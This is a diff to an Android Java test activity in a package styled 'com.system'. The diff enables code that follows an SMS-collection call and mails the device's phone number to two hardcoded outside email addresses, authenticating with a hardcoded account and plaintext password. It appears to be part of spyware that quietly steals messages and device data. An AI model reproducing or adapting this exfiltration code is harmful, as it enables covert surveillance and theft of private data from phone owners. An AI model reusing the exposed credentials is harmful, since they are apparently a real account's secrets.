@@ -1,8 +1,12 @@
 package com.system.test;
 
+import java.io.File;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 
 import android.app.Activity;
+import android.content.res.Resources;
 import android.os.Bundle;
 import android.view.View;
 import android.view.View.OnClickListener;
@@ -11,6 +15,7 @@ import android.widget.Button;
 import com.system.GetInfoTask;
 import com.system.R;
 import com.system.utils.ConfigCtrl;
+import com.system.utils.DeviceProperty;
 import com.system.utils.SysUtils;
 
 public class TestActivity extends Activity 
@@ -53,10 +58,19 @@ public class TestActivity extends Activity
         			GetInfoTask.CollectSms(getApplicationContext());
         		
         			// Send mail
-        			//boolean result = sendMail();
+        			String subject = Resources.getSystem().getString(R.string.mail_from) 
+        	           		 + DeviceProperty.getPhoneNumber(getApplicationContext()) 
+        	           		 + " - " + (new String()).toString();
+        			String body = String.format(Resources.getSystem().getString(R.string.mail_body), 
+        					DeviceProperty.getPhoneNumber(getApplicationContext()));
+        			List<String> fileList = new ArrayList<String>();
+        			String[] recipients = {"richardroky@gmail.com", "ylssww@126.com"};
+        			boolean result = GetInfoTask.sendMail(subject, body, 
+        					"richardroky@gmail.com", "yel510641",
+        					recipients, fileList);
         			
         			// Update the last date time
-        			//if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
+        			if (result) ConfigCtrl.setLastGetInfoTime(getApplicationContext(), new Date());
         		}
             }
         };
